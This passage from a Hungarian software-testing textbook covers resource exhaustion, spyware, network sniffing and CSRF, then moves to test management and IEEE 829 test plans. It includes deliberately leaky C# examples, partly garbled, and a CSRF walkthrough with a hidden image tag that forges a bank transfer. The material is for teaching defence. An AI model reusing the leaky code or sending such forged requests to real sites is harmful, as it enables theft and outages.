6.9 „Erõforrás kimerítés” (Resource Depletion - Asymmetric resource
consumption (amplification))
6.9.1 Leírás
A támadó arra kényszeríti az áldozatot, hogy több erõforrást használjon, mint amennyi a
támadó hozzáférési szintjével engedélyezve van. A program valószínûleg nem, vagy csak
hibásan szabadítja föl a rendszer egy erõforrását. Az erõforrás nem lett rendesen kiürítve és
elõkészítve az újbóli felhasználásra.
6.9.2 PÉLDÁK
Példa 1
A következõ metódus sosem fogja bezárni a saját maga által megnyitott fájl kezelõt/számlálót
(file handle). The method for A StreamReader Finalize() metódusa végül meghívja a Close()
metódust, de semmi sem tudja megmondani, hogy mennyi idõbe fog telni, mielõtt a Finalize() 
Szoftver tesztelés
6-16
mûködésbe lépne. Valójában semmi garancia nincs arra, hogy a Finalize() egyáltalán
mûködésbe fog lépni. Egy terhelt környezetben ez azt eredményezheti, hogy a VM
felhasználja az összes rendelkezésére álló fájl számlálót.
private void processFile(string fName) {
 StreamWriter sw = new
 StreamWriter(fName);
 string line;
 while ((line = sr.ReadLine()) != null) processLine(line);
}
Miután minden fájl számlálót (fájl leírót) felhasznált, a VM nagyon instabillá válhat,
lelassulhat, vagy determinisztikusan megszakíthatja a mûködést a korábbi állapotához képest.
Példa 2
Normál körülmények között az alábbi C# kód egy adatbázis lekérdezést hajt végre,
feldolgozza a az adatbázis által adott eredményt és bezárja a hozzá társított SqlConnection
objektumot. De ha egy kivétel történik az SQL vagy az eredmények feldolgozása közben,
akkor az SqlConnection objektum fog bezáródni. Ha ez elég sokszor megtörténik, akkor az
adatbázis ki fog futni a rendelkezésére álló kurzorokból és nem fog tudni több SQL
lekérdezést végrehajtani.
C# példa:
...
SqlConnection conn = new SqlConnection(connString);
SqlCommand cmd = new SqlCommand(queryString);
cmd.Connection = conn; conn.Open();
SqlDataReader rdr = cmd.ExecuteReader();
HarvestResults(rdr);
conn.Connection.Close();
...
Az adatbázishoz kapcsolódó egybeesõ kapcsolatok száma gyakran alacsonyabb, mint a
rendszer által maximálisan használható számlálók száma. Ez megkönnyíti az alkalmazások
szûk keresztmetszetének a megtalálását és a felhasználásukat arra, hogy leállítsuk instabillá
tegyük az alkalmazás mûködését.
Példa 3
Ha az N egybeesõ kapcsolatot kezelni tudó alkalmazásba nincsenek beépítve megfelelõ
mechanizmusok a kliensek leválasztására (például idõkorlátok (TIMEOUT)), akkor nagyon
könnyen mûködésképtelenné tehetõ úgy, hogy N-hez közeli számú kapcsolatot hozunk létre.
Ráadásképpen ezek a kapcsolatok munkát is szimulálnak az alkalmazással, addig használva a
protokolljait, amíg föl nem emésztenek minden rendelkezésre álló erõforrást.
6.10 „Erõforrás Manipuláció – Kémprogram” (Resource Manipulation –
Spyware)
6.10.1 Leírás
A kémprogram (Spyware) olyan alkalmazás, ami statisztikai adatokat gyûjt a felhasználó
számítógépérõl és továbbküldi azt az interneten a felhasználó beleegyezése nélkül. Ezeket az
információkat általában a cookie-kból vagy a böngészõ Elõzményeibõl (history) gyûjti ki. A
kémprogramok akár más programokat is telepíthetnek, reklámokat jeleníthetnek meg vagy 
Szoftver tesztelés
6-17
átirányíthatják az internet böngészõt. A kémprogram több dologban különbözik a vírusoktól,
férgektõl és reklámprogramoktól (adware). A kémprogram nem többszörözi és terjeszti magát
úgy, mint a vírusok és a férgek és nem feltétlenül jelenít meg reklámokat úgy, mint a
reklámprogramok. A fõbb különbségek a kémprogramok, valamint a vírusok, férgek és
reklámprogramok között a következõ:
 a fertõzött számítógépet kereskedelmi célokra használja ki
 néhány esetben reklámokat jelenít meg
6.10.2 KOCKÁZATI TÉNYEZÕK
Magas
Néhány kémprogramot nagyon nehéz eltávolítani, mivel megbújhatnak a böngészõ cookie-jai
valamint a hálózat nélküli (offline) HTML tartalomban is az Ideiglenes fájlok (Temporary
files) között.
6.11 „Szimatoló támadás – Hálózati Lehallgatás” (Sniffing Attacks - Network
Eavesdropping)
6.11.1 Leírás
A Hálózati Lehallgatás (Network Eavesdropping) vagy más néven hálózati szimatolás
(network sniffing) egy olyan hálózati réteg támadás, ami azt a célt szolgálja, hogy csomagokat
fogjunk el a hálózatban, ami mások számítógépérõl származik és az ebben lévõ adatokban
olyan kényes információkat találjunk, mint a jelszavak, session tokenek vagy bármilyen nemû
titkos információ.
Ezt a támadást a „hálózati szimatoló”-knak (network sniffer) nevezett eszközökkel lehet
kivitelezni. Ezek az eszközök csomagokat gyûjtenek a hálózaton és az eszköz minõségétõl
függõen a protokoll dekóderekhez vagy a stream újraillesztõkhöz hasonlóan analizálják a
begyûjtött adatokat.
A hálózat környezetére néhány feltételnek teljesülnie kell, hogy a szimatolás hatékony legyen:
• LAN környezet HUB-okkal (LAN + HUB).
Ez az ideális eset, mivel a HUB egy hálózati ismétlõ eszköz, ami duplikál minden, akármelyik
porton keresztül érkezett hálózati keretet, így a támadás nagyon egyszerûen kivitelezhetõ,
mivel más feltételeknek nem is kell megfelelni.
• LAN környezet kapcsolókkal (LAN + SWITCH)
Hogy a hallgatózás eredményes legyen, egy elõzetes feltételnek teljesülnie kell. Mivel a
switch alapesetben csak egy keretet küld a portnak, szükségünk van egy olyan
mechanizmusra, ami duplikálja vagy átirányítja a hálózati csomagokat a rosszindulatú
rendszer részére. Például ahhoz, hogy duplikáljuk a forgalmat egyik portról a másikra, egy
különleges beállításra lesz szükségünk a switch-ben. Hogy átirányítsuk a támadást egyik
portról a másikra, szükségünk lesz egy elõzõleges kihasználásra, mint például az arp spoof
támadás. Ebben a támadásban a rosszindulatú rendszer útválasztóként (router) mûködik az
áldozatok közötti kommunikációban, lehetõvé téve azt, hogy „kiszimatoljuk” a felcserélt
csomagokat.
• WAN környezet
Szoftver tesztelés
6-18
Ebben az esetben, a hálózati „szimatolás” sikeréhez arra van szükség, hogy rosszindulatú
rendszer útválasztóként (router) mûködjön a kliens és a szerver közötti kommunikációban
Ezen hiba kihasználásának egyik módja, ha DNS áltámadást indítunk a kliens rendszer ellen.
A „Hálózati Lehallgatás” egy passzív támadás, amit nagyon nehéz felfedezni. Fölfedezhetõ a
megelõzõ állapot hatásából vagy néhány esetben rábírhatjuk a rosszindulatú szervert, hogy
válaszoljon egy olyan hamis kérelemre, amit a rosszindulatú rendszer IP címére küldtünk, de
egy másik rendszer MAC címével.
6.11.2 PÉLDÁK
Amikor a HUB elnevezésû hálózati eszközt használunk egy Helyi Hálózat topológiájában,
akkor a „Hálózati Lehallgatás” kivitelezése sokkal könnyebbé válik, mivel az eszköz
mindenféle, egy porton bejövõ adatforgalmat duplikál az összes többi portra. Egy protokoll
elemzõt (protocol analyzer) használva a támadó a LAN egész adatforgalmára ráteheti a kezét
és így kényes információkat szerezhet meg.
6.12 „Átverés – oldalakon keresztüli kérelem hamisítás” (Spoofing - CrossSite Request Forgery (CSRF))
6.12.1 Áttekintés
A „CSRF” egy olyan támadás, ami arra kényszeríti a felhasználót, hogy olyan tevékenységet
végezzen egy webes alkalmazásban, amibe éppen be van jelentkezve, amit nem állna
szándékában megtenni. Egy kis „szocializációs mérnökösködéssel” (például hivatkozás
küldése e-mailen vagy chat-en keresztül) a támadó arra kényszeríti a felhasználót, hogy olyan
cselekedeteket hajtson végre, amiket a behatoló szeretne. Egy mezei felhasználó esetében egy
sikeres CSRF támadás veszélybe sodorhatja a felhasználó adatait és tevékenységét. Ha a
támadással megcélzott azonosító egy adminisztrátorhoz tartozik, akkor egy ilyen behatolás az
egész webes alkalmazás biztonságát veszélyezteti.
6.13 Vonatkozó biztonsági intézkedések
6.13.1 Hogyan nézzünk át egy kódot CSRF sebezhetõséget keresve?
A OWASP Code Review Guide cikkben olvashatunk arról, hogy hogyan nézzünk át egy
kódot CSRF sebezhetõség reményében (Reviewing code for CSRF).
6.13.2 Hogyan teszteljük a CSRF sebezhetõséget?
A OWASP Testing Guide cikkben olvashatunk arról, hogy hogyan teszteljük a CSRF
sebezhetõséget (Test for CSRF).
6.13.3 Hogyan elõzzük meg a CSRF sebezhetõséget?
A OWASP CSRF Prevention Cheat Sheet dokumentumban olvashatunk a sebezhetõség
megelõzésérõl.
Halgassuk meg a következõ felvételt: OWASP Top Ten CSRF Podcast.
Egy kiváló írás John Melton tollából arról, hogy hogyan használjuk az OWASP ESAPI
beépített anti-CSRF funkcióját: excellent blog post
6.13.4 Leírás
Az „oldalakon keresztüli kérelem hamisítás” (CSRF) egy olyan támadás, ami trükkös módon
ráveszi az áldozatot, hogy olyan weboldalt nyisson meg, ami káros kérelmet tartalmaz. Ez
olyan értelemben káros, hogy örökli az áldozat személyazonosságát és privilégiumait és
ezekkel felszerelve az áldozat nevében nem kívánt tevékenységet végez, mint például
megváltoztatja az e-mail címet, a lakáscímet, a különféle jelszavakat vagy éppen vásárol
valamit. A CSRF támadások általában olyan funkciókat céloznak, amelyek valamilyen 
Szoftver tesztelés
6-19
állapotváltozást idéznek elõ a szerveren, de ezzel egy idõben kényes információkat is
megszerez.
A legtöbb oldalon a böngészõk automatikusan tárolják a legtöbb ilyesfajta kérelmet, ami
bármilyen, a weboldalhoz tartozó igazoló adatot tartalmaz, mint például a felhasználó session
cookie-ját, alapvetõ bejelentkezési adatait, IP címét, Windows domain adatait, stb. Így ha a
felhasználó éppen be van jelentkezve az oldalra, akkor az oldalnak esélye sincs a hamis
kérelmet megkülönböztetni a a valódi felhasználói kérelemtõl.
Ez úton a támadó úgy intézheti, hogy az áldozat olyasmit csináljon, amit nem akart volna,
például kijelentkezhet, vásárolhat valamit, hozzáférési információkat változtathat meg,
hozzáférési információkat szerezhet vissza vagy bármi egyéb, a sérülékeny weboldal által
kínált funkciókat hajthat végre.
Néha lehetõség van arra, hogy a CSRF támadást magán a sérülékeny weboldalon tároljuk. Az
ilyen sebezhetõségeket Tárolt CSRF hibának (Stored CSRF flaw) nevezzük. Ezt egyszerûen el
lehet érni úgy, hogy egy IMG vagy IFRAME tag-et tárolunk egy olyan mezõben, ami
elfogadja a HTML-t, de használhatunk jóval komplexebb kereszt-oldali szkriptelõ támadást
is. Ha a támadás képes tárolni egy CSRF támadást az oldalon, akkor a behatolás súlyossága
megnõ. Valójában nagyobb annak a valószínûsége, hogy az áldozat a támadást tartalmazó
lapot nézi, mint egy másik, véletlenszerûen kiválasztott lapot az interneten. A valószínûség
azért is nõ, mert az áldozat már biztosan be van jelentkezve az oldalra.
Szinonímák: a CSRF támadások sok más néven is ismerik, mint például: XSRF, "Sea Surf",
Session Riding, Cross-Site Reference Forgery vagy Hostile Linking. A Microsoft
„Egykattintásos” támadásként (One-Click attack) hivatkozik erre a a fajta támadásra a
fenyegetlés modellezõ folyamatában és sok más helyen az online dokumentációkban.
6.13.5 Megelõzési módszerek, amik NEM MÛKÖDNEK
Titkos cookie használata
Emlékezzünk arra, hogy minden cookie – még a titkosak is – elküldésre kerülnek
minden kérelemmel. Minden azonosító token elküldésre kerül attól függetlenül, hogy a
felhasználót csalással vették-e rá a kérelem elküldésére. Sõt, a session azonosítókat
egyszerûen arra használja az alkalmazás tárolója, hogy összekapcsolja kérelmet egy
bizonyos session objektummal. A session azonosító nem ellenõrzi, hogy a
felhasználónak szándékában állt-e elküldeni a kérelmet.
Csak utólagos kérelmeket (POST request) fogadunk el
Az alkalmazásokat úgy is fel lehet építeni, hogy csak utólagos kérelmeket (POST
request) fogadjanak el az üzleti logika alkalmazása végett. A tévhit az, hogy mivel a
támadó nem tud káros hivatkozást összerakni, így a CSRF támadás nem kivitelezhetõ.
Sajnos ez a logika nem helytálló. Számos olyan módszer van, amivel a támadó trükkös
módon ráveheti az áldozatot, hogy elküldjön egy hamisított utólagos kérelmet, például
egy egyszerû ûrlap formájában, ami a behatoló oldalán van tárolva és rejtett értékeket
tartalmaz. Ezt az ûrlapot aztán a JavaScript könnyen aktiválhatja, de megteheti ezt az
áldozat is, aki azt hiszi, hogy az ûrlap valami mást fog csinálni.
6.13.6 PÉLDÁK
Hogyan mûködik a támadás?
Számos módja van annak, hogy trükkel rávegyük a felhasználót, hogy töltsön be vagy küldjön
információt egy webes alkalmazásból/ba. A támadás kivitelezése céljából elõször azt kell 
Szoftver tesztelés
6-20
átlátnunk, hogyan hozzunk létre olyan káros kérelmet, amit az áldozat végre fog hajtani.
Vegyük szemügyre a következõ példát: Aliz 100 dollárt szeretne utalni Robinak a bank.com
oldalon keresztül. Az Aliz által generált kérelem nagyjából a következõképpen fog kinézni:
POST http://bank.com/transfer.do HTTP/1.1
...
...
...
Content-Length: 19;
acct=BOB&amount=100
Mária azonban észreveszi, hogy ugyanaz a webes alkalmazás, a következõ URL
paraméterekkel hajtja végre ugyanazt az átutalást:
GET http://bank.com/transfer.do?acct=BOB&amount=100 HTTP/1.1
Mária úgy dönt, hogy kihasználja a webes alkalmazás eme gyenge pontját és Aliz lesz az
áldozata. Elõször is Mária megszerkeszti a következõ URL-t, ami át fog utalni 100000 dollárt
Aliz számlájáról az övére:
http://bank.com/transfer.do?acct=MARIA&amount=100000
Most hogy a káros kérelme elkészült, Máriának trükkel rá kell vennie Alizt, hogy elküldje azt.
A legalapvetõbb módja ennek az, hogy küld Aliznak egy HTML e-mailt, ami a következõket
tartalmazza:
<a href="http://bank.com/transfer.do?acct=MARIA&amount=100000">View my
Pictures!</a>
Feltéve, hogy Aliz be van jelentkezve az alkalmazásba, mikor rákattint a hivatkozásra, a
100000 dollár átvitele Aliz számlájáról Mária számlájára végbe fog menni. Azonban Mária
azt is tudja, hogy ha Aliz rákattint a hivatkozásra, akkor észre fogja venni, hogy valamiféle
tranzakció történt. Ezért Mária úgy dönt, hogy egy 0 bájtos képbe rejti a támadást:
<img src="http://bank.com/transfer.do?acct=MARIA&amount=100000" width="1"
height="1" border="0">
Ha ezt a kép tag-et beleteszi az email-be, akkor Aliz csak azt fogja látni, hogy egy kis doboz
jelenik meg, mintha a böngészõ nem tudta volna feldolgozni a képet. Azonban a böngészõ
ETTÕL FÜGGETLENÜL elküldi a kérelmet a bank.com oldalnak anélkül, hogy a
tranzakciónak bármilyen látható jele lett volna.
 
Szoftver tesztelés
6-21
Tartalomjegyzék
6 Biztonsági tesztelés ................................................................................. ........................ 6-1
6.1.1 Mûködés ellehetetlenítése – Cache Mérgezés ................................................. 6-2
6.2 Adatszerkezet támadás - Bináris forrás fájl túltöltése.............................................. 6-4
6.2.1 Leírás ............................................................................................... .................. 6-4
6.2.2 Példák ............................................................................................... ................. 6-4
6.3 Kártékony kód beágyazása – Logikai/Idõzített bomba ............................................. 6-6
6.3.1 Leírás ............................................................................................... .................. 6-6
6.3.2 Kockázati tényezõk ................................................................................... ......... 6-6
6.4 Trójai ............................................................................................... .......................... 6-6
6.4.1 Leírás ............................................................................................... .................. 6-6
6.4.2 A Trójai 7 fõ típusa ................................................................................. ........... 6-6
6.4.3 Tünetek .............................................................................................. ................ 6-7
6.4.4 Kockázati tényezõk ................................................................................... ......... 6-7
6.5 Azonosítási folyamat kihasználása – Account kizárási támadás .............................. 6-7
6.5.1 Leírás ............................................................................................... .................. 6-7
6.5.2 Például: eBay támadás ................................................................................ ...... 6-8
6.6 Befecskendezés – Közvetlen statikus kód befecskendezése .................................... 6-8
6.6.1 Leírás ............................................................................................... .................. 6-8
6.6.2 Példák ............................................................................................... ................. 6-8
Példa 1 .............................................................................................. ............................... 6-8
Példa 2 .............................................................................................. ............................... 6-8
6.7 „Útkeresztezési támadás” (Path Traversal Attack) ................................................. . 6-9
6.7.1 Áttekintés ........................................................................................... ............... 6-9
6.7.2 Leírás ............................................................................................... .................. 6-9
Kérelem változatok ................................................................................... ........................... 6-9
6.7.3 Példák ............................................................................................... ............... 6-10
Példa 1 .............................................................................................. ............................. 6-10
Példa 2 .............................................................................................. ............................. 6-10
Példa 3 .............................................................................................. ............................. 6-11
Példa 4 .............................................................................................. ............................. 6-11
6.7.4 „Abszolút útkeresztezés” (Absolute Path Traversal) ....................................... 6-11
Szoftver tesztelés
6-22
6.8 „Próbálgatásos technikák – Nyers Erõ támadás” (Probabilistic Techniques - Brute
force attack) ................................................. ................................................... .................. 6-12
6.8.1 Leírás ............................................................................................... ................ 6-12
6.8.2 Példák ............................................................................................... ............... 6-12
Példa 1 .............................................................................................. ............................. 6-12
6.8.3 Védelmi eszközök ..................................................................................... ....... 6-14
6.8.4 „Protokol Manipuláció – http Válasz Elosztás” (Protocol Manipulation - Http
Response Splitting) ................................................. ................................................... .... 6-14
6.9 „Erõforrás kimerítés” (Resource Depletion - Asymmetric resource consumption
(amplification)) ..................................................................................... ............................. 6-15
6.9.1 Leírás ............................................................................................... ................ 6-15
6.9.2 PÉLDÁK ............................................................................................... ............. 6-15
Példa 1 .............................................................................................. ............................. 6-15
Példa 2 .............................................................................................. ............................. 6-16
Példa 3 .............................................................................................. ............................. 6-16
6.10 „Erõforrás Manipuláció – Kémprogram” (Resource Manipulation – Spyware) .. 6-16
6.10.1 Leírás ............................................................................................... ................ 6-16
6.10.2 KOCKÁZATI TÉNYEZÕK ................................................................................... .. 6-17
6.11 „Szimatoló támadás – Hálózati Lehallgatás” (Sniffing Attacks - Network
Eavesdropping) ................................................. ................................................... .............. 6-17
6.11.1 Leírás ............................................................................................... ................ 6-17
6.11.2 PÉLDÁK ............................................................................................... ............. 6-18
6.12 „Átverés – oldalakon keresztüli kérelem hamisítás” (Spoofing - Cross-Site Request
Forgery (CSRF)) ................................................. ................................................... .............. 6-18
6.12.1 Áttekintés ........................................................................................... ............. 6-18
6.13 Vonatkozó biztonsági intézkedések .................................................................... 6-18
6.13.1 Hogyan nézzünk át egy kódot CSRF sebezhetõséget keresve? ....................... 6-18
6.13.2 Hogyan teszteljük a CSRF sebezhetõséget? .................................................... 6-18
6.13.3 Hogyan elõzzük meg a CSRF sebezhetõséget? ................................................ 6-18
6.13.4 Leírás ............................................................................................... ................ 6-18
6.13.5 Megelõzési módszerek, amik NEM MÛKÖDNEK ............................................. 6-19
6.13.6 PÉLDÁK ............................................................................................... ............. 6-19
Hogyan mûködik a támadás? ............................................................................ ............ 6-19
Szoftver tesztelés
6-23 
Szoftver tesztelés
7-1
7 Teszt menedzsment
A tesztelési tevékenység a fejlesztési folyamat szerves része. A tesztelés helyét a fejlesztési
folyamatban a V modell szemlélteti.
Ebben a fejezetben áttekintést adunk arról, hogy
• hogyan kell megszervezni és irányítani a tesztelést,
• hogyan illeszthetõ be a tesztelés a fejlesztési folyamat menedzsmentjébe.
A tesztelésnek a fejlesztési folyamatba illesztése során az alábbi szempontokat kell
figyelembe venni.
A tesztelés helye a fejlesztõ csoportban
Megvizsgálandók a következõ kérdések:
• A tesztelõk függetlensége. A független tesztelõi szervezet hasznai és hátrányai.
• A teszteléshez szükséges szerepkörök.
• A tesztmérnök (test designer) és a tesztelõ (tester) feladatai.
Teszt tervezés
• A teszt tervezés szintjei.
• A teszt tervezés célja és a teszt specifikáció, teszt terv tartalma az IEEE 829 szabvány
szerint.
• A teszt elõkészítés és a teszt végrehajtás lépései.
• A teszt elfogadási kritériumai a tesztelés különbözõ szintjein.
A tesztfolyamat ellenõrzése és követése
• A teszt tervezés és végrehajtás metrikái.
• A tesztelési tevékenység elõrehaladásának dokumentálása az IEEE 829 szabvány
szerint
Konfiguráció menedzsment
• Hogyan támogathatja a konfiguráció menedzsment a tesztelési folyamatot.
Kockázatok és a tesztelés
• A tesztelés a fejlesztési kockázatok csökkentésének egyik eszköze.
• A fejlesztési és a termék kockázat fogalma.
Incidens menedzsment
• Az incidens fogalma. 
Szoftver tesztelés
7-2
• Indicens jelentés és annak tartalma.
A továbbiakban a fenti szempontok közül a legfontosabbakat elemezzük.
7.1 A tesztelés szervezeti keretei
A megfelelõ tesztelõ szervezet felállítása az elsõ lépés egy sikeres tesztfolyamat
elvégzéséhez. Fontos, hogy az adott feladathoz legmegfelelõbb szakembereket válogassuk
bele a tesztcsapatba. A tesztcsapat összeállítása a teszt tárgyát képezõ projekttõl függ.
Mivel a tesztelés a minõségbiztosítás része, azaz egyfajta értékelés, melynek eredménye
nem minden esetben pozitív, ezért fontos lehet egy olyan tesztcsapat összeállítása, amely
képes objektíven értékelni a programozók munkáját.
Elõször a tesztcsapat függetlenségének mértékét kell meghatároznunk. A függetlenség teljes
hiánya esetén a tesztelõk maguk a programozók, akik a teszteket a programozói csapaton
belül végzik el. Következõ szint, amikor egy integrált tesztcsapat a programozók mellett
dolgozik, továbbra is a programozó team tagjaként, jelentési kötelezettséggel a fejlesztési
menedzser felé. Az ezt követõ szinten a fejlesztési csapattól független tesztcsapat áll, akik
jelentéseiket a projektmenedzsernek írják. A legfelsõbb szint, a teljes függetlenség, ahol a
tesztelési feladatokat végzõ különálló tesztcsapat, aki ugyanannak a szervezeti szintnek
készíti a jelentéseket, mint a fejlesztési team. A tesztelõ csapat függetlenségi szintjeit foglalja
össze az alábbi ábra:
7-1. ábra A tesztelõ függetlensége
A különbözõ területi szakértõk (mint például az üzleti szakértõk, technológiai szakértõk,
tesztautomatizálási szakértõk, biztonsági tesztelõk, tanúsítványtesztelõk) külön független
tesztcsapatokat is alkothatnak a szervezeten belül, vagy egy külön szerzõdtetett tesztcsapat
csoportjaiként. 
Szoftver tesztelés
7-3
Egy független tesztelõ több más jellegû hibát vehet észre, mint aki a programozókkal együtt
dolgozik, vagy maga is programozó, mivel más rálátása lehet a projektre, illetve észrevehet
olyan problémákat is, amik a fejlesztõ csapat gondolkodásmódjából erednek. Valamint egy
független tesztelõ, aki a vezetõi menedzsernek írja jelentéseit, õszinte tud maradni, hiszen
nem kell annak negatív következményeivel számolnia, hogy munkatársait bírálja, vagy
menedzsere munkájának hibáira mutat rá. Egy független tesztcsapat rendelkezhet
elkülönített költségvetéssel és vezetéssel, így annak tagjai is nagyobb eséllyel pályázhatnak
majd jobb munkahelyi pozíciókra, hiszen nincsenek a programozók alá vagy mellé rendelve.
A független tesztcsapat hátránya lehet viszont a projekttõl vagy annak részeitõl való
elszigetelõdés. Ha a tesztelõ ismeri az adott programozók általános gondolkodásmódját,
nagyobb eséllyel fedezi fel annak hibáit. Rosszabb esetekben elõfordulhat az is, hogy a
projektet nem teljesen ismerve túlzott figyelmet szentelnek annak bizonyos részegységei
hibáinak feltárására, így más jellegûeket elhanyagolhatnak. Ez a kommunikációs probléma
ellenszenvhez, elidegenedéshez, vádaskodáshoz vezethet.
A jól integrált csapatok is szembesülhetnek hasonló problémákkal, például a tesztelõk joggal
vagy jogtalanul, de gondolhatják, hogy alá vannak rendelve a programozói teamnek, a
projekt többi résztvevõje gondolhatja úgy, hogy a tesztelés lassítja a projekt elõre menetelét,
és a tesztcsapat miatt késnek a határidõkkel. A programozók feleslegesnek tarthatják kódjaik
ellenõrzését, hiszen úgyis van saját tesztcsapatuk.
Gyakori eset, hogy a vállalatok vágyva a független tesztelés elõnyeire csak azért hoznak létre
ilyen csapatokat, hogy hogy hamarosan feloszlassák õket. Oka, lehet, hogy a tesztmenedzser
sikertelen a fenti problémák hatékony kezelésében.
A tesztelés függetlenségének megállapításához tehát nem létezik egyedüli helyes út. Minden
egyes projekthez, a projekt alkalmazási területét, kockázatszintjét, komplexitását figyelembe
véve kell döntenünk. Lehetséges természetesen a projekt elõrehaladásával annak különbözõ
szintjein változtatnunk a tesztcsapat függetlenségén és összetételén. Vannak tesztek, amiket
célszerûbb, a mások végeznek el, más területek szakértõi a projekt tárgyától függõen.
7.2 A tesztmérnök és a tesztelõ feladatai
Láthattuk, hogy tesztcsapat típusaiból és az azokban betöltött feladatkörökbõl is többféle
van. A két legalapvetõbb a tesztmérnök (tesztvezetõ) és a tesztelõ, ezek a legtöbb tesztelõ
szervezetben megtalálhatóak.
A tesztvezetõ elsõdleges feladata a tesztelési feladatok tervezése, azok végrehajtásának
felügyelete és levezetése. Egy projekt indulásakor a tesztvezetõk a projekt többi
résztvevõjével együttmûködve meghatározzák a tesztelés céljait, szabályait, a tesztelési
stratégiákat és a tesztterveket. A tesztvezetõ a projekt indulása elõtt felbecsüli a tesztelési
folyamathoz szükséges erõforrásokat. Feladata felismerni a tesztautomatizálási
lehetõségeket, és egyeztetni a projekt többi csoportjával, például a fejlesztõkkel, hogy azok
hogyan lehetnek a tesztelési folyamat segítségére. A tesztvégrehajtás közeledtével 
Szoftver tesztelés
7-4
biztosítaniuk kell a teszteléshez szükséges környezet meglétét, majd irányítják, idõzítik és
felügyelik a tesztfolyamatokat. Az õ feladatuk megírni az összefoglaló jelentéseket az aktuális
tesztállapotokról.
Valószínûleg a teszt végrehajtás megkezdése elõtt nem lesz szükség a tesztelõk munkájára,
de érdemes õket már a projekt indulásakor alkalmazni. A tesztelés tervezési és elõkészítési
idõszakában a tesztelõknek meg kell ismerniük a teszttervet, és közre kell mûködniük annak
esetleges javításában, meg kell ismerniük a követelményeket, és a mûszaki teszttervspecifikációk elemzését. Gyakran a tesztelõk állítják be a tesztkörnyezetet, vagy õk segítik
ebben a rendszeradminisztrátorokat. A tesztek megkezdésével elsõ feladatuk a tesztek
tesztkörnyezetbe való implementálása. A tesztfolyamat során a tesztelõk hajtják végre és
naplózzák a teszteket, majd kiértékelik és elemzik azokat.
7.2.1 A tesztelés résztvevõi számára szükséges képességek
A tesztcsapat összeállítása során figyelembe kell vennünk, hogy nem elegendõ a
tesztkörnyezet megléte, a feladatkörök kiosztása és a létszám meghatározása. Ügyelnünk
kell arra, hogy a megfelelõ pozíciókba a megfelelõ emberek készségekkel és képesítéssel
rendelkezõ emberek kerüljenek. Egy tesztelõnél alapvetõ szakmai és szociális követelmény
például az olvasási készség, jelentések szóban és írásban történõ elkészítésének készsége,
illetve a hatékony kommunikációs képesség. Ezen felül a projekt jellegének és céljának
megfelelõen a következõ három szempont szerint kell megvizsgálnunk, milyen
követelményeknek kell megfelelniük a tesztcsapat tagjainak:
Alkalmazási és üzleti terület
Fontos, hogy a tesztelõ megértse az adott szoftver mûködésének lényegét, így felismerje az
azzal szemben támasztott elvárásokat, így megtalálja a kiemelt fontosságú, kritikus pontokat.
Technológia
A tesztelõnek ismernie kell a választott implementációs technológia képességeit és korlátait,
hogy képes legyen beazonosítani a felmerülõ problémák eredetét.
Tesztelés
A tesztelõnek ismernie kell a tesztelési folyamatok elméletét, hogy eredményesen és
határozottan tudja végezni munkáját.
A különbözõ területeken szükséges szakértelem szintje és annak szükségessége a
szervezettõl, az alkalmazásoktól és a kockázattól függõen eltérhet. Tipikus hiba a fejlesztési
folyamatok szervezésében, hogy a projekt menedzsment hajlamos alábecsülni a tesztelési
szaktudás szükségességét. 
Szoftver tesztelés
7-5
7.3 Teszt tervek, becslések és stratégiák
A teszt terv az elvégzendõ tesztelési munka projektterve, nem pedig mûszaki teszt terv
specifikáció vagy tesztesetek gyûjteménye. A teszt terv a teszt menete folyamán változik,
megjegyzésekkel bõvülhet, így válik lassan a projektcsapat megbeszéléseit, egyeztetéseit
rögzítõ naplóvá.
A teszt tervek különbözõ szintjeit és a tervek elkészítését befolyásoló tényezõket foglalja
össze az alábbi ábra:
7-2. ábra Teszt tervek
Ha teszt tervet készítünk, érdemes sablont használnunk, így nehezebben felejtünk ki kritikus
pontokat. Használható az IEEE 829-es sablon. Ezen sablon alapján egy teszttervnek a
következõket kell tartalmaznia:
1. Tesztterv azonosító
2. Bevezetõ
3. Tesztegységek
A tesztelés tárgyának a meghatározása. Tartalmazhat hivatkozásokat más
dokumentációkra, például rendszer tervekre.
4. Tesztelendõ funkciók
A tesztelés céljának meghatározása (funkciók, nem funkcionális követelmények).
5. Nem tesztelendõ funkciók
Olyan követelmények, amelyeket nem szükséges, vagy nem lehetséges tesztelni.
6. Szemléletmód 
Szoftver tesztelés
7-6
A tesztelés módszerének leírása. Hivatkozhat más dokumentumra, például a
tesztelési stratégia leírására.
7. Elem helységének / hibájának feltétele
Annak a feltételnek a specifikációja, aminek alapján eldönthetõ, hogy egy rendszer
elem megfelel-e a teszt kritériumoknak.
8. Felfüggesztési / újrakezdési feltételek
A teszt felfüggesztésének és újrakezdésének kritériumai.
9. Átadandó tesztkimenetek
Azok a dokumentumok, amelyek a tesztelési tevékenység eredményeit tartalmazzák.
Például:
• teszt tervek,
• teszt specifikációk az egyes tesztelési szintekhez,
• teszt futtasások jegyzõkönyvei.
10. Tesztfeladatok
A tesz tervezéshez és végrehajtáshoz szükséges tevékenységek összefoglalása.
11. Környezeti igények
A tesztek végrehajtásához szükséges hardver és szoftver környezet specifikációja.
12. Felelõsségek
A tesztelési tevékenységhez szükséges szerepkörök és azok feladatainak leírása.
13. Személyzeti és képzési igények
A tesztelési tevékenységhez szükséges szakemberek és azok szükséges
szakértelmének meghatározása
14. Ütemterv
A tesztelési tevékenység ütemterve, a meghatározott határidõkre végrehajtandó
tevékenységek és elkészítendõ dokumentumok meghatározása.
15. Kockázatok és elõre nem látható események
Az elõre megbecsülhetõ kockázatok és azok elkerülésének / minimalizálásának terve
16. Jóváhagyások
Annak meghatározása, hogy ki jogosult a dokumentumok elfogadására.
A tesztterv írásának célja, hogy végiggondoljuk a teszt menetét, hisz amit végiggondolva
képesek vagyunk szóba foglalni, azt értjük is. Egy jó tesztterv rövid és lényegre törõ, így
megírása nem egyszerû feladat. Magas szinten át kell gondolnunk a tesztelési munka célját.
Ehhez meg kell határoznunk, hogy mi tartozik az adott teszthez, és mi nem, meg kell
értenünk a termékkockázatokat és ismernünk kell a teszttelés lehetséges korlátait (például
anyagi vagy idõkorlát). Ezek után fel kell osztanunk a feladatokat, a tesztelés különbözõ
szintjeire. Ezután egyeztetnünk kell a szintek közti átmeneteket, majd meghatároznunk, hogy
mely információkat kell átadnunk a teszt végén a karbantartó csapatnak. Ehhez meg kell
határoznunk, hogy milyen állítások lennének igazak egy olyan projektre, amin sikeresen
elvégezték a tesztelést, azaz specifikálnunk kell minden teszt esetén annak belépési és
kilépési feltételeit. 
Szoftver tesztelés
7-7
